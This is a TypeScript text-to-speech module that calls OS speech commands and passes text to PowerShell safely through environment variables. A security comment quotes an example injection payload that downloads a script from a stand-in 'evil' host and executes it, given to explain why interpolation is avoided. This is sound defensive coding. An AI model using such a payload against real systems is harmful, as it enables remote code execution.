// Voice gateway — uses OS built-in commands. No API key required.
// macOS: `say`
// Windows: `PowerShell Add-Type -AssemblyName System.Speech`
// Linux: falls back to silent.

import { spawn } from "node:child_process";
import { isShuttingDown } from "../db.js";

let voiceEnabled = process.env.VOICE_ENABLED !== "0";
const VOICE_NAME = process.env.VOICE_NAME ?? (process.platform === "darwin" ? "Samantha" : "Microsoft David");

export function isVoiceEnabled(): boolean {
  return voiceEnabled;
}

export function setVoiceEnabled(enabled: boolean): void {
  voiceEnabled = enabled;
}

export function speak(text: string): { spoken: boolean; voice: string } {
  if (!voiceEnabled || isShuttingDown()) return { spoken: false, voice: VOICE_NAME };

  try {
    if (process.platform === "darwin") {
      const child = spawn("say", ["-v", VOICE_NAME, text], {
        detached: true,
        stdio: "ignore",
      });
      child.unref();
      return { spoken: true, voice: VOICE_NAME };
    }

    if (process.platform === "win32") {
      // SECURITY: never interpolate the TTS text into the PowerShell command
      // string. PowerShell evaluates $(...) subexpressions and $variables INSIDE
      // double-quoted strings, so interpolated text — which can originate from the
      // LLM's answer, /api/voice/test, or a timer label — is a remote-code-execution
      // vector (e.g. "$(iwr evil/x.ps1|iex)"). Doubling quotes does NOT stop it.
      // Instead we pass the text (and voice) as ENVIRONMENT VARIABLES, which
      // PowerShell treats as inert data, and reference them with $env: — the value
      // is never re-parsed as code.
      const psScript =
        "Add-Type -AssemblyName System.Speech; " +
        "$s = New-Object System.Speech.Synthesis.SpeechSynthesizer; " +
        "if ($env:AURA_TTS_VOICE) { try { $s.SelectVoice($env:AURA_TTS_VOICE) } catch {} } " +
        "$s.Speak($env:AURA_TTS_TEXT)";
      const child = spawn("powershell", ["-NoProfile", "-NonInteractive", "-Command", psScript], {
        detached: true,
        stdio: "ignore",
        env: { ...process.env, AURA_TTS_TEXT: text, AURA_TTS_VOICE: VOICE_NAME },
      });
      child.unref();
      return { spoken: true, voice: "System.Speech" };
    }

    return { spoken: false, voice: VOICE_NAME };
  } catch {
    return { spoken: false, voice: VOICE_NAME };
  }
}

export async function speakWithRetry(
  text: string,
  attempts = 3,
  delayMs = 500,
): Promise<{ spoken: boolean; voice: string; attempts: number }> {
  let last = speak(text);
  let count = 1;
  while (!last.spoken && count < attempts && !isShuttingDown()) {
    await new Promise((resolve) => setTimeout(resolve, delayMs));
    last = speak(text);
    count++;
  }
  return { ...last, attempts: count };
}
